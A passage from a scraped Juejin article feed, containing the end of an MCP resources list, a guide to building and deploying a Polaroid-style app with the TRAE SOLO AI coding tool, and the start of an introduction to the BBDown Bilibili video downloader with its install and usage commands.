<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmodelcontextprotocol%2Ftypescript-sdk" target="_blank" title="https://github.com/modelcontextprotocol/typescript-sdk" ref="nofollow noopener noreferrer">MCP TypeScript SDK</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmodelcontextprotocol%2Fpython-sdk" target="_blank" title="https://github.com/modelcontextprotocol/python-sdk" ref="nofollow noopener noreferrer">MCP Python SDK</a></li>
</ul>
<h4 data-id="heading-97">社区资源</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmodelcontextprotocol%2Fservers" target="_blank" title="https://github.com/modelcontextprotocol/servers" ref="nofollow noopener noreferrer">MCP Servers Hub</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpunkpeye%2Fawesome-mcp-servers" target="_blank" title="https://github.com/punkpeye/awesome-mcp-servers" ref="nofollow noopener noreferrer">Awesome MCP Servers</a></li>
</ul>
<p><strong>作者</strong>：前端领秀——悄悄学习，惊艳所有人~</p>
<h3 data-id="heading-98"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0756528722f34e8d940996215c1693af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6a2B6aaW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835972&amp;x-signature=owqb0Tvjt1v0MOVxKd02Ca%2FAlXo%3D" alt="扫码_搜索联合传播样式-白色版.png" loading="lazy"/></h3></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🚀TRAE SOLO 实战干货：从零到一部署国内版“拍立得”应用的踩坑避坑指南🧣]]></title>    <link>https://juejin.cn/post/7577198193214750763</link>    <guid>https://juejin.cn/post/7577198193214750763</guid>    <pubDate>2025-11-27T08:28:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577198193214750763" data-draft-id="7576953459544424502" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🚀TRAE SOLO 实战干货：从零到一部署国内版“拍立得”应用的踩坑避坑指南🧣"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" content="2025-11-27T08:28:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="围巾哥萧尘"/> <meta itemprop="url" content="https://juejin.cn/user/1222312659548446"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🚀TRAE SOLO 实战干货：从零到一部署国内版“拍立得”应用的踩坑避坑指南🧣
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1222312659548446/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    围巾哥萧尘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T08:28:14.000Z" title="Thu Nov 27 2025 08:28:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🚀TRAE SOLO 实战干货：从零到一部署国内版“拍立得”应用的踩坑避坑指南🧣</h2>
<p><strong>导读：</strong> 随着 TRAE SOLO 3.0 Code 工具功能的日益强大，快速构建应用成为可能。今天，给大家分析零基础小白如何构建如“拍立得”这类热门产品，并分享提高开发的效率的解决问题的实战策略。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29096b33051e451dbfc88fc84592ad24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu05be-5ZOl6JCn5bCY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764838092&amp;x-signature=AZvgfqA6YT9MUD2Ac6i2MZcql6I%3D" alt="截屏2025-11-27 15.23.18.png" loading="lazy"/></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1oRUzBZEPQ%2F%3Fspm_id_from%3D333.1387.homepage.video_card.click" target="_blank" title="https://www.bilibili.com/video/BV1oRUzBZEPQ/?spm_id_from=333.1387.homepage.video_card.click" ref="nofollow noopener noreferrer">TRAE SOLO Code 3.0 拍立得国内版本开发实际演示🧣#TRAE 3.0 SOLO出道 并 @trae #SOLO已就位 #TRAE发布 ##TR</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Ftrae52utezgj.vercel.app%2F" target="_blank" title="https://trae52utezgj.vercel.app/" ref="nofollow noopener noreferrer">trae52utezgj.vercel.app/</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8fba2220af8a4d4fb94f9fbdd56d2482~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu05be-5ZOl6JCn5bCY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764838092&amp;x-signature=T9iAyggH2%2BdU2JQuBTy5hdswHsU%3D" alt="35.gif" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-1">第一部分：实战中的“四大深坑”与高效避坑指南</h3>
<p>在 TRAE  的开发流程中，许多问题并非技术难题，而是工具特性和操作逻辑带来的限制。掌握以下避坑策略，能大幅缩短迭代时间：</p>
<h4 data-id="heading-2">陷阱一：初始效果，不尽人意</h4>
<p>当工具根据你的初始提示（Prompt）生成初步界面时，其美观度和细节往往和你的提示词和原型图息息相关。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b52d4db733fc416ba1c7b4e8b4bcbd7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu05be-5ZOl6JCn5bCY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764838092&amp;x-signature=Qd1zBl4i%2B%2BcBF2S2IEz72abjJBc%3D" alt="截屏2025-11-27 10.46.43.png" loading="lazy"/></p>
<ul>
<li>
<p><strong>避坑指南（策略）：</strong> <strong>优化原型和提示词是关键</strong>。</p>
<ol>
<li>
<p><strong>原型制胜：</strong> 我个人的经验总结是，在制作任何产品时， <strong>你的原型 的 图片 越 好</strong> ，工具就<strong>越 能 够 去 还 原 你 的 这 个 原型 图 的 样 式</strong>。高品质的原型和提示词是高效还原的基础。</p>
</li>
<li>
<p><strong>借助外部工具：</strong> 当初始效果不满意时，应重新制作和优化提示。我一般下都是<strong>借助 Google Gemini</strong> 来生成一段更精细、更准确的提示，以此来优化界面。</p>
</li>
</ol>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/316baf32d63a4db38b7c7c5eeccb3076~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu05be-5ZOl6JCn5bCY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764838092&amp;x-signature=fOG2TPF3N%2FUODw2ZVWFrIEfKM9M%3D" alt="截屏2025-11-27 15.25.28.png" loading="lazy"/></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">A</span> creamy beige retro instant camera on the <span class="hljs-attribute">left</span>, facing forward with <span class="hljs-selector-tag">a</span> reflection of <span class="hljs-selector-tag">a</span> girl in the lens. <span class="hljs-selector-tag">To</span> the <span class="hljs-attribute">right</span>, three scattered Polaroid photos of <span class="hljs-selector-tag">a</span> young Asian woman with long hair in playful selfie poses. The photos have handwritten text at the <span class="hljs-attribute">bottom</span> saying "MAY <span class="hljs-selector-tag">I</span> MEET YOU" and "<span class="hljs-number">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">19</span>". Clean light gray <span class="hljs-attribute">background</span> with <span class="hljs-selector-tag">a</span> subtle white polka dot pattern. Soft studio lighting, <span class="hljs-number">3</span>D C4D render style, cute aesthetic, high detail, product photography vibe, soft shadows.

中文提示词分析 (用于理解或国内 AI 工具):

主体： 奶黄色的复古拍立得相机 (Creamy beige retro instant camera)，镜头有反光细节 (Reflection in lens)。

配角： 三张拍立得照片 (Three Polaroid photos)，散落在右侧。

人物内容： 亚洲女孩自拍 (Asian girl selfies)，长发，俏皮姿势。

文字： 照片底部写着 <span class="hljs-string">"MAY I MEET YOU"</span> 和日期。

背景： 浅灰色背景，带白色波点图案 (Light gray background with white dots)。

风格： C4D <span class="hljs-number">3</span>D渲染风格，电商产品摄影，柔光，可爱，高质感。

关键细节注意事项：

关于文字： 目前的 AI（如 FLUX 或 Midjourney v6）已经能比较准确地生成指定的文字，但日期和具体句子可能需要抽卡几次才能完全正确。

关于鼠标手势： 图中右下角的照片上有一个白色的“鼠标手型光标”，这暗示了这可能是一张 UI 界面设计图或者是为了增加互动感的设计。如果在提示词中需要这个细节，可以加上 <span class="hljs-string">"a white cursor hand icon hovering over one photo"</span>。
</code></pre>
<h4 data-id="heading-3">陷阱二：功能缺失与等待延迟</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b4f06b7789e42deac043a456a76de7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu05be-5ZOl6JCn5bCY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764838092&amp;x-signature=laxzR2xJ4YlvO4Vp%2BDlxrifnG%2Bo%3D" alt="截屏2025-11-27 15.56.44.png" loading="lazy"/></p>
<p>在功能完善阶段，我发现打造“拍立得”应用缺少必要的<strong>清除功能</strong>和<strong>删除功能 <strong>。同时，在要求工具增加功能时，它“有 的 时 候 它 反 应 的 时 候 比 较 慢”，</strong> “不能够直接快速执行”</strong>。</p>
<ul>
<li>
<p><strong>避坑指南（解决方案）：</strong></p>
<ol>
<li><strong>明确要求增补：</strong> 必须通过提示明确要求工具增补缺失的功能，例如要求它<strong>去 增 加 这 个 清 除 的 功 能 和 这 个 删 除 的 功 能</strong>。</li>
<li><strong>重复操作法：</strong> 针对工具执行延迟的问题，我们的经验是，需要<strong>多 去 重 复 的 操 作 一 下</strong>，这样它才能比较快地执行我们的想法。</li>
</ol>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7bb54b99bff4026aaa87d990b17ba4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu05be-5ZOl6JCn5bCY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764838092&amp;x-signature=d3OAM2q03GbeEAqeHUBVRfR6a%2FY%3D" alt="截屏2025-11-27 15.56.35.png" loading="lazy"/></p>
<h4 data-id="heading-4">陷阱三：国内版本部署功能缺失</h4>
<p>国内版本的 TRAE  “缺乏一个部署的 这个 按 钮”，我们可以通过国际版 TRAE 来结合使用，从而完成自动化部署。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9011bd3309e4b4c97391a7f88823e3b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu05be-5ZOl6JCn5bCY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764838092&amp;x-signature=qtYGZBiSfaMAXXglAsHyjkkU32E%3D" alt="截屏2025-11-27 16.19.10.png" loading="lazy"/></p>
<ul>
<li>
<p><strong>避坑指南（解决方案）：</strong> <strong>版本部署</strong>。</p>
<ul>
<li>使用<strong>国际版本</strong>的浏览器界面去完成应用的部署。在国际版本中找到部署按钮并点击，才能将应用的网址上传上去。</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-5">第二部分：效率倍增的个人经验总结与思维升级</h3>
<p>使用 TRAE SOLO 绝不仅仅是输入提示词，更重要的是思维模式的转变。</p>
<h4 data-id="heading-6">1. 核心的“干货”：问题的定义是重中之重</h4>
<p>当前编程工具的功能已经“比较强大”。因此， <strong>“你 最 需 要 去 做 核 心 的 事 情”</strong> ，不再是关注如何编码，而是要**“去 完 成 这 个 核 心 的 解 决” <strong>，即：</strong> “问 題 的 定 义 就 很 重 要”**。</p>
<ul>
<li><strong>思维转变：</strong> 应当思考你在日常工作或生活中遇到了<strong>什么比较棘手的问题 <strong>，然后利用这些工具来解决</strong>，你 实 际 当 中 的 问 题</strong>。只有明确了要解决的问题，工具的核心效果才能更好地发挥。</li>
</ul>
<h4 data-id="heading-7">2. 用“流程化体系”提升工作效率</h4>
<p>我建议采用<strong>编程思维来思考问题</strong>，借助日常工作中遇到的问题，<strong>将重复化的工作</strong>做 成 这 种 流 程 化 的 自 动 化  体 系。这种流程化的体系能够让您的工作效率有更大的提升。</p>
<h4 data-id="heading-8">3. 成本优势与入门途径</h4>
<p>对于初学者而言，国内版本提供了极佳的入门机会：</p>
<ul>
<li><strong>免费优势：</strong> 国内版本的最大优势在于它是<strong>免 费 使 用 这 个 solo code  这个 功 能</strong>。</li>
<li><strong>付费差异：</strong> 相比之下，如果想更好地使用<strong>国际版本</strong>，通常需要<strong>支 付 一 定 的 费 用</strong>。</li>
<li><strong>总结：</strong> 因此，<strong>国内版本是一个“比 较 好 的  入 门 的  途 径”</strong> ，建议大家可以去实际尝试一下。</li>
</ul>
<h3 data-id="heading-9">结论</h3>
<p>通过掌握原型提示词的优化、功能迭代等重复操作法，以及国际版本部署策略，我们可以高效地利用 TRAE SOLO Code 3.0 完成应用开发。但最核心的价值，还是在于从<strong>问题定义</strong>出发，将编程思维融入工作，把重复性任务转化为<strong>流程化体系</strong>，这才是真正实现效率倍增的意义所在。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[BBDown：高效便捷的哔哩哔哩视频下载工具]]></title>    <link>https://juejin.cn/post/7577042851080650795</link>    <guid>https://juejin.cn/post/7577042851080650795</guid>    <pubDate>2025-11-27T08:44:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577042851080650795" data-draft-id="7577042851080618027" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="BBDown：高效便捷的哔哩哔哩视频下载工具"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2025-11-27T08:44:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            BBDown：高效便捷的哔哩哔哩视频下载工具
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T08:44:29.000Z" title="Thu Nov 27 2025 08:44:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">BBDown：高效便捷的哔哩哔哩视频下载工具</h2>
<h3 data-id="heading-1">项目描述</h3>
<p>BBDown是一个免费且便捷高效的哔哩哔哩下载/解析软件，支持命令行操作和HTTP API服务。该项目采用C#开发，提供完整的B站视频解析和下载解决方案，支持多种视频格式、多线程下载、弹幕下载等丰富功能。</p>
<h3 data-id="heading-2">功能特性</h3>
<ul>
<li><strong>多平台解析</strong>：支持Web端、TV端、APP端和国际版API解析模式</li>
<li><strong>多种下载方式</strong>：支持普通下载、aria2c下载和多线程下载</li>
<li><strong>格式支持</strong>：支持HEVC、AV1、AVC等多种视频编码格式</li>
<li><strong>画质选择</strong>：提供丰富的画质优先级设置，支持8K、杜比视界等高清格式</li>
<li><strong>弹幕处理</strong>：支持XML和ASS格式的弹幕下载</li>
<li><strong>API服务</strong>：内置HTTP服务器，提供完整的RESTful API接口</li>
<li><strong>批量下载</strong>：支持收藏夹、合集、系列列表等批量下载功能</li>
<li><strong>交互式选择</strong>：提供交互式清晰度选择界面</li>
</ul>
<h3 data-id="heading-3">安装指南</h3>
<h4 data-id="heading-4">通过Dotnet Tool安装</h4>
<p>如果你本地有dotnet环境，使用如下命令即可安装使用：</p>
<pre><code class="hljs language-bash" lang="bash">dotnet tool install --global BBDown
</code></pre>
<h4 data-id="heading-5">更新BBDown</h4>
<pre><code class="hljs language-bash" lang="bash">dotnet tool update --global BBDown
</code></pre>
<h4 data-id="heading-6">系统要求</h4>
<ul>
<li>.NET运行时环境</li>
<li>混流需要外部程序：ffmpeg或mp4box</li>
<li>杜比视界需要ffmpeg 5.0以上或新版mp4box</li>
</ul>
<h4 data-id="heading-7">下载地址</h4>
<ul>
<li>Release版本：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnilaoda%2FBBDown%2Freleases" target="_blank" title="https://github.com/nilaoda/BBDown/releases" ref="nofollow noopener noreferrer">GitHub Releases</a></li>
<li>自动构建测试版本：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnilaoda%2FBBDown%2Factions" target="_blank" title="https://github.com/nilaoda/BBDown/actions" ref="nofollow noopener noreferrer">GitHub Actions</a></li>
</ul>
<h3 data-id="heading-8">使用说明</h3>
<h4 data-id="heading-9">基础使用</h4>
<pre><code class="hljs language-bash" lang="bash">BBDown &lt;url&gt; [options]
</code></pre>
<h4 data-id="heading-10">常用参数示例</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 仅显示视频信息而不下载</span>
BBDown <span class="hljs-string">"BV1qt4y1X7TW"</span> --only-show-info

<span class="hljs-comment"># 使用TV端API解析</span>
BBDown <span class="hljs-string">"BV1qt4y1X7TW"</span> --use-tv-api

<span class="hljs-comment"># 设置编码优先级</span>
